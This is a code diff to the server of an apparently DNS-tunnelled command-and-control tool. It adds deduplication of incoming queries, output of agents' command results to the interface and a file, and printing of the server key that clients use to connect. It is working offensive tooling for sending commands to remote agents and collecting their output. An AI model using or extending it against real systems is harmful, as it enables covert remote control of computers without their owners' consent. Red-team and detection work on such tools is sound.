@@ -32,6 +32,7 @@ var ServerPacketBuffersWithSignature = make(map[int][]c2.MessagePacketWithSignat
 
 //3d buffer for public key and parentpartID. first string is the public key
 var outgoingBuffer = make(map[string]map[uint16][]string)
+var dedupHashTable = make(map[uint64]bool)
 
 type agentStatusForServer struct {
 	LastAckFromAgentServerTime      uint32
@@ -43,6 +44,7 @@ type agentStatusForServer struct {
 
 // first string is the public key
 var ConnectedAgents = make(map[string]agentStatusForServer)
+var CommandWriter io.Writer
 
 // log received healthcheck
 func MessageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
@@ -133,17 +135,16 @@ func SendFileToAgent(payload []byte, firstPacket c2.MessagePacketWithSignature) 
 }
 
 // shows the output of any command run by agent and sent back to us.
-func displayCommandResult(fullPayload []byte) {
+func displayCommandResult(fullPayload []byte, signature *cryptography.PublicKey) {
 	// probably should save this in a temp file rather than log. //todo
-	if len(fullPayload) > conf.CompressionThreshold {
-		rdata := bytes.NewReader(bytes.Trim(fullPayload, "\x00"))
-		r, _ := gzip.NewReader(rdata)
-		s, _ := ioutil.ReadAll(r)
-		log.Info("showing decompressed result") //todo:remove
-		log.Warn(string(s))
-	} else {
-		log.Warnf(string(bytes.Trim(fullPayload, "\x00")))
+	out := bytes.Trim(fullPayload, "\x00")
+	rdata := bytes.NewReader(out)
+	r, err := gzip.NewReader(rdata)
+	if err == nil {
+		out, _ = ioutil.ReadAll(r)
 	}
+	log.Infof("Command result: %s", out)
+	fmt.Fprintf(CommandWriter, "command result coming from %s:\n%s\n ------\n", signature.String(), string(out))
 }
 
 func HandleRunCommandResFromAgent(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
@@ -193,7 +194,7 @@ func HandleRunCommandResFromAgent(Packet c2.MessagePacketWithSignature, q *dns.M
 	// todo: clean the memory for this parentpartID
 	// delete(ServerPacketBuffersWithSignature, int(packets[0].Msg.ParentPartID))
 	// todo: how do we acknowledge that we're done here and we both go back to healthcheck?
-	displayCommandResult(fullPayload)
+	displayCommandResult(fullPayload, Packet.Signature)
 	// remove the buffer from memory
 	delete(ServerPacketBuffersWithSignature, int(Packet.Msg.ParentPartID))
 	return nil
@@ -202,6 +203,7 @@ func HandleRunCommandResFromAgent(Packet c2.MessagePacketWithSignature, q *dns.M
 // handle the Server switching an agent's status to run command with a payload, puts the agent's status to run command so we handle it next time the healthcheck arrives
 func RunCommandOnAgent(agentPublicKey *cryptography.PublicKey, command string) error {
 	log.Infof("invoking command '%s' for the client", command)
+	fmt.Fprintf(CommandWriter, "invoking command '%s' on %s\n", command, agentPublicKey.String())
 	msg := c2.MessagePacket{
 		TimeStamp:   uint32(time.Now().Unix()),
 		MessageType: c2.MessageExecuteCommand,
@@ -219,7 +221,7 @@ func RunCommandOnAgent(agentPublicKey *cryptography.PublicKey, command string) e
 			outgoingBuffer[agentPublicKey.String()] = make(map[uint16][]string)
 			outgoingBuffer[agentPublicKey.String()][parentPartId] = append(outgoingBuffer[agentPublicKey.String()][parentPartId], Answers[0])
 		}
-		log.Errorf("key and ParentPartId already exists in the buffer. Please try again")
+		log.Infof("key and ParentPartId already exist in the buffer, overwriting...")
 
 	} else {
 		//initialize the map
@@ -313,7 +315,27 @@ func cleanupBuffer(timeout time.Duration) error {
 	return nil //todo
 }
 
+func isMsgDuplicate(data []byte) bool {
+	// dedup checks
+	skipForDudup := false
+	hash := c2.FNV1A(data)
+	_, ok := dedupHashTable[hash] // check for existence
+	if !ok {
+		dedupHashTable[hash] = true
+	} else {
+		skipForDudup = true
+	}
+
+	return skipForDudup
+}
+
 func parseQuery(m *dns.Msg) error {
+	// since the C2 works by A questions at the moment, we cna check dedup by looking at the first question
+	// todo: test this
+	if isMsgDuplicate([]byte(m.Question[0].Name)) {
+		log.Infof("Duplicate message received, discarding")
+		return nil
+	}
 	outs, err := c2.DecryptIncomingPacket(m, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, nil)
 	if err != nil {
 		log.Infof("Error in Decrypting incoming packet: %v", err)
@@ -387,6 +409,16 @@ func RunServer(cmd *cobra.Command, args []string) {
 		log.SetOutput(UiLog)
 	}
 
+	if conf.GlobalServerConfig.OutFile != "" {
+		f, err := os.OpenFile(conf.GlobalServerConfig.OutFile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
+		if err != nil {
+			log.Fatalf("error opening file: %v", err)
+		}
+		CommandWriter = io.MultiWriter(UiLog, f)
+	} else {
+		CommandWriter = UiLog
+	}
+
 	var err error
 	conf.GlobalServerConfig.ListenAddress, err = cmd.Flags().GetString("listenAddress")
 	errorHandler(err)
@@ -395,6 +427,8 @@ func RunServer(cmd *cobra.Command, args []string) {
 	errorHandler(err)
 	conf.GlobalServerConfig.PrivateKey, err = cryptography.PrivateKeyFromString(conf.GlobalServerConfig.PrivateKeyBasexx)
 	errorHandler(err)
+
+	log.Infof("Use the following public key to connect clients: %s", conf.GlobalServerConfig.PrivateKey.GetPublicKey().String())
 
 	// todo: public keys
 
